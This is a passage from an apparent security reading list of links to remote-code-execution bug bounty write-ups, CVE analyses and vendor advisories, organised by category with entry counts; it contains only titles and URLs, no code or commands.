- [Write Up – Private Bug Bounty: RCE In EC2 Instance Via SSH With Private Key Exposed On Public Github Repository – $xx,000 USD](https://omespino.com/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/)
- [Pre-Auth RCE in Moodle Part II - Session Hijack in Moodle's Shibboleth](https://haxolot.com/posts/2022/moodle_pre_auth_shibboleth_rce_part2/)
- [Pre-Auth RCE in Moodle Part I - PHP Object Injection in Shibboleth](https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/)
- [Exploiting Struts RCE on 2.5.26](https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html)
- [Apache Struts double evaluation RCE lottery](https://securitylab.github.com/research/apache-struts-double-evaluation/)
- [[RCE] Remote Code Execution in Wordpress iOS Application (version 9.3)](https://blog.evanricafort.com/2018/02/rce-remote-code-execution-in-wordpress.html)
- [Spring Boot RCE](https://web.archive.org/web/20170206221502/https://deadpool.sh/2017/RCE-Springs/)

### 2.5b CVE hunting & vendor advisories

105 entries.

- [Weblogic Remote Code Execution (Exploiting CVE-2019-2725)](https://blog.cybercastle.io/weblogic-remote-code-execution-exploiting-cve-2019-2725/)
- [CVE-2020-8150 – Remote Code Execution as SYSTEM/root via Backblaze](https://github.com/geffner/CVE-2020-8150)
- [How I found 10 Remote Code Execution in 10 minutes CVE-2020–5902](https://medium.com/@b3twise/how-i-found-10-remote-code-execution-in-10-minutes-cve-2020-5902-3def1aa29e9b)
- [Hunting on ASPX Application For P1’s [Unauthenticated SOAP,RCE, Info Disclosure]](https://elmahdi.tistory.com/3)
- [Responsible Disclosure: Breaking out of a Sandboxed Editor to perform RCE ](https://jatindhankhar.in/blog/responsible-disclosure-breaking-out-of-a-sandboxed-editor-to-perform-rce/)
- [[RCE] Remote code execution at api.PrivateProgram.com (CVE-2017-5638)](https://www.mohamedharon.com/2019/04/apache-strust-rce.html)
- [Plone Authenticated RCE (CVE-2021-32633) - A Bug Bounter's Journey](https://cyllective.com/blog/post/plone-authenticated-rce-cve-2021-32633/)
- [How I get Pre-Auth Remote Code Execution (CVE-2021–42237) on one of the Vendors](https://caesarevan23.medium.com/how-i-get-pre-auth-remote-code-execution-cve-2021-42237-on-one-of-the-vendors-f62e35cb90de)
- [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
- [WhatsUp Gold Pre-Auth RCE WriteDataFile Primitive (CVE-2024-4883)](https://summoning.team/blog/progress-whatsup-gold-writedatafile-cve-2024-4883-rce/)
- [WhatsUp Gold Pre-Auth RCE GetFileWithoutZip Primitive (CVE-2024-4885)](https://summoning.team/blog/progress-whatsup-gold-rce-cve-2024-4885/)
- [CVE-2024-27292: docAssembling exploits for RCE](https://tantosec.com/blog/docassemble/)
- [Probllama: Ollama Remote Code Execution Vulnerability (CVE-2024-37032) – Overview and Mitigations](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [Two Bytes is Plenty: FortiGate RCE with CVE-2024-21762](https://www.assetnote.io/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762)
- [CVE-2024-21378 — Remote Code Execution in Microsoft Outlook](https://www.netspi.com/blog/technical/red-team-operations/microsoft-outlook-remote-code-execution-cve-2024-21378/)
- [CVE-2023-36049: Microsoft .NET CRLF Injection Arbitrary File Write/deletion Vulnerability](https://www.zerodayinitiative.com/blog/2024/3/6/cve-2023-36049-microsoft-net-crlf-injection-arbitrary-file-writedeletion-vulnerability)
- [Remote Code Execution by Bypassing Cloudflare: CVE-2022–29464 Analysis](https://medium.com/@alii76tt/remote-code-execution-by-bypassing-cloudflare-cve-2022-29464-analysis-02328e0e284a)
- [Atlassian Confluence - Remote Code Execution (CVE-2023-22527)](https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/)
- [High Signal Detection and Exploitation of Ivanti's Pulse Connect Secure Auth Bypass & RCE (CVE-2023-46805 & CVE-2024-21887)](https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce)
- [Unauthenticated RCE in Adobe Coldfusion – CVE-2023-26360](https://blog.securelayer7.net/unauthorized-rce-in-adobe-coldfusion/)
- [MobSF Remote code execution (via CVE-2024-21633)](https://github.com/0x33c0unt/CVE-2024-21633)
- [CVE-2023-22524: RCE Vulnerability in Atlassian Companion for macOS](https://www.imperva.com/blog/cve-2023-22524-rce-vulnerability-in-atlassian-companion-for-macos/)
- [CVE-2023-33733 RCE via HTMLi in reportlab](https://github.com/Sudistark/BB-Writeups/blob/main/2023/CVE-2023-33733-rce-via-htmli-in-reportlab.md)
- [RCE in Progress WS_FTP Ad Hoc via IIS HTTP Modules (CVE-2023-40044)](https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044)
- [[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023–29357 & CVE-2023–24955)](https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/)
- [DoubleQlik: Bypassing the Fix for CVE-2023-41265 to Achieve Unauthenticated Remote Code Execution](https://www.praetorian.com/blog/doubleqlik-bypassing-the-original-fix-for-cve-2023-41265/)
- [CVE-2023-38146: Arbitrary Code Execution via Windows Themes](https://exploits.forsale/themebleed/)
- [MyBB Admin Panel RCE CVE-2023-41362](https://blog.sorcery.ie/posts/mybb_acp_rce/)
- [Blog: CVE-2023-4634 - Tricky Unauthenticated RCE on Wordpress Media Library Assistant Plugin using a good old Imagick](https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/)
- [CVE-2023-36844 And Friends: RCE In Juniper Devices](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)
- [(CVE-2023-32530) Trend Micro Apex Central 2019 (<= Build 6016) Authenticated RCE](https://starlabs.sg/advisories/23/23-32530/)
- [Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)
- [CVE-2023-38408: Remote Code Execution in OpenSSH’s forwarded ssh-agent](https://blog.qualys.com/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent)
- [Bee-yond Capacity: Unauthenticated RCE in Extreme Networks/Aerohive Wireless APs - CVE-2023-35803](https://research.aurainfosec.io/pentest/bee-yond-capacity/)
- [Encrypted Doesn't Mean Authenticated: ShareFile RCE (CVE-2023-24489)](https://blog.assetnote.io/2023/07/04/citrix-sharefile-rce/)
- [Technical Details of CVE-2023-30990 - Unauthenticated RCE in IBM i DDM Service](https://blog.silentsignal.eu/2023/07/03/ibm-i-dde-vulnerability-cve-2023-30990/)
- [CVE-2023-20864: Remote Code Execution In VMware Aria Operations For Logs](https://www.zerodayinitiative.com/blog/2023/6/29/cve-2023-20864-remote-code-execution-in-vmware-aria-operations-for-logs)
- [CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup](https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/)
- [Taking Entire server control Part 2 of How I Earned $2500 in 5 Minutes | CVE-2017–5638 | OGNL injection | RCE](https://medium.com/@karthithehacker/taking-entire-server-control-part-2-of-how-i-earned-2500-in-5-minutes-cve-2017-5638-ognl-92f4213ca219)
- [chonked pt.2: exploiting cve-2023-33476 for remote code execution](https://blog.coffinsec.com/0day/2023/06/19/minidlna-cve-2023-33476-exploits.html)
- [LibreOffice Arbitrary File Write (CVE-2023-1883)](https://secfault-security.com/blog/libreoffice.html)
- [MOVEIt Transfer RCE Part Two (CVE-2023-34362)](https://blog.assetnote.io/2023/06/13/moveit-transfer-part-two/)
- [Pre-Authenticated RCE In VMware VRealize Network Insight - CVE-2023-20887](https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/)
- [XORtigate: Pre-authentication Remote Code Execution on Fortigate VPN (CVE-2023-27997)](https://blog.lexfo.fr/xortigate-cve-2023-27997.html)
- [Dynamic Linq Injection Remote Code Execution Vulnerability (CVE-2023-32571)](https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/)
- [Sony Bravia Remote Code Execution Disclosure](https://www.whiteoaksecurity.com/blog/sony-bravia-remote-code-execution-disclosure/)
- [CVE-2023-24941: Microsoft Network File System Remote Code Execution](https://www.zerodayinitiative.com/blog/2023/5/31/cve-2023-24941-microsoft-network-file-system-remote-code-execution)
- [CVE-2023-33733 reportlab RCE](https://github.com/c53elyas/CVE-2023-33733)
- [VSCode Remote Code Execution advisory](https://blog.ammaraskar.com/vscode-rce/)
- [Avast Anti-Virus privileged arbitrary file create on virus restore (CVE-2023-1586)](https://the-deniss.github.io/posts/avast-privileged-arbitrary-file-create-on-restore/)
- [CVE-2023-28231: RCE In The Microsoft Windows DHCPv6 Service](https://www.zerodayinitiative.com/blog/2023/5/1/cve-2023-28231-rce-in-the-microsoft-windows-dhcpv6-service)
- [SSD Advisory –  KerioControl Remote Code Execution](https://ssd-disclosure.com/ssd-advisory-keriocontrol-remote-code-execution/)
- [Avast Anti-Virus privileged arbitrary file create on virus quarantine (CVE-2023-1585 and CVE-2023-1587)](https://the-deniss.github.io/posts/2023/04/26/avast-privileged-arbitrary-file-create-on-quarantine.html)
- [CVE-2023-27524: Insecure Default Configuration in Apache Superset Leads to Remote Code Execution](https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/)
- [Finding RCE in NodeJS templating engine 'Eta' - CVE-2022-25967](https://rayhan0x01.github.io/ctf/2023/04/01/finding-rce-in-eta-cve-2022-25967.html)
- [Remote code execution in BIRT Viewer ≤ 4.12.0 (CVE-2023-0100)](https://www.synacktiv.com/sites/default/files/2023-03/Synacktiv-BIRTViewer-CVE-2023-0100_1.pdf)
- [Producing a POC for CVE-2022-42475 (Fortinet RCE)](https://blog.scrt.ch/2023/03/14/producing-a-poc-for-cve-2022-42475-fortinet-rce/)
- [PwnAgent: A One-Click WAN-side RCE in Netgear RAX Routers with CVE-2023-24749](https://mahaloz.re/2023/02/25/pwnagent-netgear.html)
- [CVE-2022-38108: RCE In Solarwinds Network Performance Monitor](https://www.zerodayinitiative.com/blog/2023/2/27/cve-2022-38108-rce-in-solarwinds-network-performance-monitor)
- [EoP via Arbitrary File Write/Overwite in Group Policy Client “gpsvc” – CVE-2022-37955](https://decoder.cloud/2023/02/16/eop-via-arbitrary-file-write-overwite-in-group-policy-client-gpsvc-cve-2022-37955/)
- [Adobe Acrobat Reader - resetForm - CAgg UaF - RCE Exploit - CVE-2023-21608](https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608)
- [CVE-2022-35690: Unauthenticated RCE In Adobe ColdFusion](https://www.zerodayinitiative.com/blog/2023/1/18/cve-2022-35690-unauthenticated-rce-in-adobe-coldfusion)
- [CVE-2022-21587 (Oracle E-Business Suite Unauthenticated RCE)](https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/)
- [Foxit PDF Reader - Use after Free - Remote Code Execution Exploit - CVE-2022-28672](https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672)
- [CVE-2021-43444 to 43449: Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution](https://labs.nettitude.com/blog/exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/)
- [CVE-2021-40662 Chamilo LMS 1.11.14 RCE](https://hacklido.com/d/90-cve-2021-40662-chamilo-lms-11114-rce)
- [CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You](https://emily.id.au/tailscale)
- [CVE-2022-22241: Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities](https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/)
- [CVE 2022–24082, RCE in the PEGA Platform — Discovery, Remediation & Technical Details (Long Live JMX!!!)](https://marcin-wolak.medium.com/cve-2022-24082-rce-in-the-pega-platform-discovery-remediation-technical-details-long-live-69efb5437316)
- [Enter "Sandbreak" - Vulnerability In vm2 Sandbox Module Enables Remote Code Execution (CVE-2022-36067)](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- [SSD Advisory – pfSense Post Auth RCE](https://ssd-disclosure.com/ssd-advisory-pfsense-post-auth-rce/)
- [QUEST KACE Desktop Authority Pre-Auth Remote Code Execution (CVE-2021-44031)](https://labs.jumpsec.com/quest-kace-desktop-authority-pre-auth-remote-code-execution-cve-2021-44031/)
- [CVE-2022-35405 Manage engines RCE (Password Manager Pro, PAM360 and Access Manager Plus)](https://www.bigous.me/2022/09/06/CVE-2022-35405.html)
- [CVE-2022-34715: More Microsoft Windows NFS V4 Remote Code Execution](https://www.zerodayinitiative.com/blog/2022/8/31/cve-2022-34715-more-microsoft-windows-nfs-v4-remote-code-execution)
- [CVE-2022-26113: FortiClient Arbitrary File Write As SYSTEM](https://rhinosecuritylabs.com/research/cve-2022-26113-forticlient-arbitrary-file-write-as-system/)
- [Paracosme - CVE-2022-33318 - Remote Code Execution in ICONICS Genesis64](https://github.com/0vercl0k/paracosme)
- [Remote Code Execution on Element Desktop Application using Node Integration in Sub Frames Bypass - CVE-2022-23597](https://blog.electrovolt.io/posts/element-rce/)
- [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
- [CVE-2022–36446 — Webmin 1.996 — Remote Code Execution (RCE — Authenticated) During Install New Packages](https://medium.com/@emirpolat/cve-2022-36446-webmin-1-997-7a9225af3165)
- [Gitlab Project Import RCE Analysis (CVE-2022-2185)](https://starlabs.sg/blog/2022/07-gitlab-project-import-rce-analysis-cve-2022-2185/)
- [CVE-2022-30136: Microsoft Windows Network File System V4 Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/blog/2022/7/13/cve-2022-30136-microsoft-windows-network-file-system-v4-remote-code-execution-vulnerability)
- [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
- [Visual Studio Code - Remote Code Execution in Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [mysqlnd/pdo password buffer overflow leading to RCE (CVE 2022-31626)](https://bugs.php.net/bug.php?id=81719)
- [Bygone Vulnerabilities - Remote Code Execution in IBM Lotus SameTime Clients (CVE-2013-0553)](https://hoyahaxa.blogspot.com/2022/05/bygone-vulnerabilities-remote-code.html)
- [CVE-2022-27643 - NETGEAR R6700v3 upnpd Buffer Overflow Remote Code Execution Vulnerability](https://blog.relyze.com/2022/03/cve-2022-27643-netgear-r6700v3-upnpd.html)
- [Remote Code Execution on Western Digital PR4100 NAS (CVE-2022-23121)](https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/)
- [Technical Advisory – Apple macOS XAR – Arbitrary File Write (CVE-2022-22582)](https://research.nccgroup.com/2022/03/15/technical-advisory-apple-macos-xar-arbitrary-file-write-cve-2022-22582/)
- [Oracle Access Manager Pre-Auth RCE (CVE-2021–35587 Analysis)](https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316)
- [CVE-2021-45467: CWP CentOS Web Panel – preauth RCE](https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/)
- [Advisory: Cisco RV340 Dual WAN Gigabit VPN Router (RCE over LAN)](https://www.iot-inspector.com/blog/advisory-cisco-rv340-dual-wan-gigabit-vpn-router-rce-over-lan/)
- [Advisory: Western Digital My Cloud Pro Series PR4100 RCE](https://www.iot-inspector.com/blog/advisory-western-digital-my-cloud-pro-series-pr4100-rce/)
- [RCE In Adobe Acrobat Reader For Android(CVE-2021-40724)](https://hulkvision.github.io/blog/post1/)
- [SSD Advisory – Rocket.Chat Client-side Remote Code Execution](https://ssd-disclosure.com/ssd-advisory-rocket-chat-client-side-remote-code-execution/)
- [Exploitation Of CVE-2021-21220 – From Incorrect JIT Behavior To RCE](https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce)
- [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237](https://blog.assetnote.io/2021/11/02/sitecore-rce/)
- [Apple XAR – Arbitrary File Write (CVE-2021-30833)](https://research.nccgroup.com/2021/10/28/technical-advisory-apple-xar-arbitrary-file-write-cve-2021-30833/)
- [CVE-2021-26420: Remote Code Execution In Sharepoint Via Workflow Compilation](https://www.zerodayinitiative.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation)
- [RCE in Citrix ShareFile Storage Zones Controller (CVE-2021-22941) – A Walk-Through](https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html)
- [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
- [ExifTool CVE-2021-22204 - Arbitrary Code Execution](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)
- [CVE-2021-30481: Source engine remote code execution via game invites](https://secret.club/2021/04/20/source-engine-rce-invite.html)
- [Remote Code Execution – LimeSurvey (CVE-2018-7556)](https://yeuchimse.com/remote-code-execution-limesurvey-cve-2018-7556/)
- [Weblogic RCE by only one GET request — CVE-2020–14882 Analysis](https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf)
- [MS Enterprise app management service RCE. CVE-2022-35841](https://www.pentestpartners.com/security-blog/ms-enterprise-app-management-service-rce-cve-2022-35841/)

### 2.5c Gadget / ecosystem / client-stack research

13 entries.

- [Abusing ImageMagick to obtain RCE](https://strynx.org/imagemagick-rce/)
- [[2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package](https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643)
- [Spip Preauth RCE 2024: Part 2, A Big Upload](https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_2_a_big_upload/)
- [Spip Preauth RCE 2024: Part 1, The Feather](https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/)
- [Evernote RCE: From PDF.js font-injection to All-platform Electron exposed ipcRenderer with listened BrokerBridge Remote-Code Execution](https://0reg.dev/blog/evernote-rce)
- [npm search RCE? - Escape Sequence Injection](https://blog.solidsnail.com/posts/npm-esc-seq)
- [How a simple Directory Listing leads to PII Data Leakage, Remote Code Execution and many more vulnerabilities on a HR management subdomain](https://medium.com/@ar_hawk/how-a-simple-directory-listing-leads-to-pii-data-leakage-remote-code-execution-and-many-more-104b09e644f4)
- [#BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r)
- [Remote Code Execution Vulnerability in Azure Pipelines Can Lead To Software Supply Chain Attack](https://www.legitsecurity.com/blog/remote-code-execution-vulnerability-in-azure-pipelines-can-lead-to-software-supply-chain-attack)
- [RCE on Spip and Root-Me, v2!](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me_v2/)
- [Remote code execution in cdnjs of Cloudflare](https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/)
- [RCE via Internal Access to Adminer Database Management (Critical)](https://infosecwriteups.com/rce-via-internal-access-to-adminer-database-management-critical-d3dc2a1d392a)
- [RCE on Spip and Root-Me](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/)

### 2.5d Community RCE war stories

231 entries.

- [Attack of the clones 2: Git CLI remote code execution strikes back](https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/)
- [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)
- [Achieving Remote Code Execution By Exploiting Variable Check Feature](https://www.shawarkhan.com/2021/01/achieve-remote-code-execution-by.html)
- [Write Up: Google VRP N/A – Sandboxed Rce As Root On Apigee API Proxies](https://omespino.com/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/)
- [“Important, Spoofing” - zero-click, wormable, cross-platform remote code execution in Microsoft Teams](https://github.com/oskarsve/ms-teams-rce)
- [Arbitrary File Write On Client By ADB Pull](https://daeken.svbtle.com/arbitrary-file-write-by-adb-pull)
- [Attack of the clones: Git clients remote code execution](https://blog.blazeinfosec.com/attack-of-the-clones-github-desktop-remote-code-execution/)
- [Leaked .git folder leads to RCE](https://james-clee.com/2020/11/01/leaked-git-folder-leads-to-rce/)
- [Wormable remote code execution in Alien Swarm](https://secret.club/2020/10/30/alien-swarm-rce.html)
- [Samsung S20 - RCE via Samsung Galaxy Store App](https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/)
- [GitHub - RCE via git option injection (almost) - $20,000 Bounty](https://devcraft.io/2020/10/18/github-rce-git-inject.html)
- [Discord Desktop app RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html)
- [Arbitrary code execution on Facebook for Android through download feature](https://medium.com/@dPhoeniixx/arbitrary-code-execution-on-facebook-for-android-through-download-feature-fb6826e33e0f)
- [How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM](https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html)
- [From Android Static Analysis to RCE on Prod](https://blog.dixitaditya.com/from-android-app-to-rce/)
- [RCE via image upload functionality](https://medium.com/@escapesequence89/rce-via-image-upload-functionality-925c902943b8)
- [Exploiting Bitdefender Antivirus: RCE from any website](https://palant.info/2020/06/22/exploiting-bitdefender-antivirus-rce-from-any-website/)
- [It took me only 5 minutes to find an RCE on Bentley](https://medium.com/@divyanshsharma2401/it-took-me-only-5-minutes-to-find-an-rce-on-bentley-38265da15788)
- [The Accidental RCE](https://medium.com/@__mr_beast__/the-accidental-rce-7ceef9cee179)
- [How dangerous is Request Splitting, a vulnerability in Golang or how we found the RCE in Portainer and hacked Uber](https://medium.com/@andrewaeva_55205/how-dangerous-is-request-splitting-a-vulnerability-in-golang-or-how-we-found-the-rce-in-portainer-7339ba24c871)
- [RCE in Google Cloud Deployment Manager](https://www.ezequiel.tech/2020/05/rce-in-cloud-dm.html)
- [1-click RCE on Keybase](https://www.shielder.it/blog/1-click-rce-on-keybase/)
- [Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study](https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/)
- [Remote Image Upload Leads to RCE (Inject Malicious Code to PHP-GD Image)](https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada)
- [Finding a P1 in one minute with Shodan.io (RCE)](https://medium.com/@sw33tlie/finding-a-p1-in-one-minute-with-shodan-io-rce-735e08123f52)
- [From Recon to Optimizing RCE Results - Simple Story with One of the Biggest ICT Company in the World](https://medium.com/bugbountywriteup/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a)
- [Simple Remote Code Execution Vulnerability Examples for Beginners](https://medium.com/bugbountywriteup/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311)
- [My First RCE (Stressed Employee gets me 2x bounty)](https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37)
- [My first RCE: a tale of good ideas and good friends](https://rez0.blog/hacking/2019/11/29/rce-via-imagetragick.html)
- [How I found RCE But Got Duplicated](https://medium.com/@smilehackerofficial/how-i-found-rce-but-got-duplicated-ea7b8b010990)
- [HTML to PDF converter bug leads to RCE in Facebook server](https://ysamm.com/?pd=280)
- [Two Easy RCE in Atlassian Products](https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f)
- [RCE in Ruby using Mustache Templates](https://rhys.io/post/rce-in-ruby-using-mustache-templates)
- [Nuget/Squirrel uncontrolled endpoints leads to arbitrary code execution](https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12)
- [About a Sucuri RCE…and How Not to Handle Bug Bounty Reports](https://www.rcesecurity.com/2019/06/about-a-sucuri-rce-and-how-not-to-handle-bug-bounty-reports/)
- [REMOTE CODE EXECUTION ! 😜 Recon Wins](https://medium.com/@vishnu0002/remote-code-execution-recon-wins-e9c1db79f3da)
- [Remote code execution On Microsoft edge using URL Protocol](https://medium.com/@mattharr0ey/remote-code-execution-on-microsoft-edge-url-protocol-a67d0f96b32d)
- [Dell KACE K1000 Remote Code Execution — the Story of Bug K1–18652](https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/)
- [From Hunting for a Laptop to Hunting down Remote Code Execution](https://medium.com/@aniltom/from-hunting-for-a-laptop-to-hunting-down-remote-code-execution-72cce2761846)
- [RCE in nokia.com](https://medium.com/@sampanna/rce-in-nokia-com-59b308e4e882)
- [Remote Code Execution on a Facebook server](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/)
- [RCE in Hubspot with EL injection in HubL](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [GitHub Desktop RCE (OSX)](https://pwning.re/2018/12/04/github-desktop-rce/)
- [Microsoft Edge Remote Code Execution](https://leucosite.com/Microsoft-Edge-RCE/)
- [Traversing the Path to RCE](https://hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/)
- [How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System](http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html)
- [RCE due to ShowExceptions](https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions)
- [RCE on Yahoo Luminate](https://sites.google.com/securifyinc.com/secblogs/yahoo-luminate-rce)
- [Latex to RCE, Private Bug Bounty Program](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution](https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/)
- [How I got hall of fame in two fortune 500 companies — An RCE story…](https://medium.com/@emenalf/how-i-got-hall-of-fame-in-two-fortune-500-companies-an-rce-story-9c89cead81ff)
- [RCE by uploading a web.config](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)
- [$36k Google App Engine RCE](https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce)
- [How I found 2.9 RCE at Yahoo! Bug Bounty program](https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7)
- [#BugBounty — How I was able to bypass firewall to get RCE and then went from server shell to get root user account!](https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-bypass-firewall-to-get-rce-and-then-went-from-server-shell-to-get-783f71131b94)
- [No RCE? Then SSH to the box!](http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/)
- [Getting a RCE — CTF Way](https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f)
- [May the Shells be with You - A Star Wars RCE Adventure!](https://blog.zsec.uk/rce-starwars/)
- [How I got 5500$ from Yahoo for RCE](https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6)
- [Airbnb – Ruby on Rails String Interpolation led to Remote Code Execution](https://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/)
- [RCE In AddThis](https://whitehatnepal.tumblr.com/post/149933960267/rce-in-addthis)
- [Remote Code Execution (RCE) on Microsoft’s ‘signout.live.com’](http://www.kernelpicnic.net/2016/07/24/Microsoft-signout.live.com-Remote-Code-Execution-Write-Up.html)
- [[manager.paypal.com] Remote Code Execution Vulnerability](https://artsploit.blogspot.com/2016/01/paypal-rce.html)
- [How I found my first RCE | by Vrushabh Lakhani](https://medium.com/@lakhaniv28/how-i-found-my-first-rce-c063546114ef)
- [We Spent $20 To Achieve RCE And Accidentally Became The Admins Of .MOBI](https://labs.watchtowr.com/we-spent-20-to-achieve-rce-and-accidentally-became-the-admins-of-mobi/)
- [Part 2: From Byovdll To Arbitrary Code Execution In Lsass](https://blog.scrt.ch/2024/08/15/ghost-in-the-ppl-part-2-from-byovdll-to-arbitrary-code-execution-in-lsass/)
- [How I got $24000 Bounty from a Log4j RCE in Apple App Store.](https://medium.com/@meharhuzaifa777/exploiting-log4j-rce-in-apple-app-store-ca99a549de1f)
- [Hitting the jackpot with RCE!](https://medium.com/@gokulsspace/hitting-the-jackpot-with-rce-43755cac1415)
- [Traccar 5 Remote Code Execution Vulnerabilities](https://www.horizon3.ai/attack-research/disclosures/traccar-5-remote-code-execution-vulnerabilities/)
- [Unveiling Remote Code Execution in AI chatbot workflows 💵](https://infosecwriteups.com/unveiling-remote-code-execution-in-ai-chatbot-workflows-3c7f633f63c3)
- [KnowBe4 RCE and LPE](https://www.pentestpartners.com/security-blog/knowbe4-rce-and-lpe/)
- [JNDI Injection Remote Code Execution via Path Manipulation in MemoryUserDatabaseFactory](https://srcincite.io/blog/2024/07/21/jndi-injection-rce-via-path-manipulation-in-memoryuserdatabasefactory.html)
- [Preauth RCE on NVIDIA Triton Server](https://sites.google.com/site/zhiniangpeng/blogs/Triton-RCE)
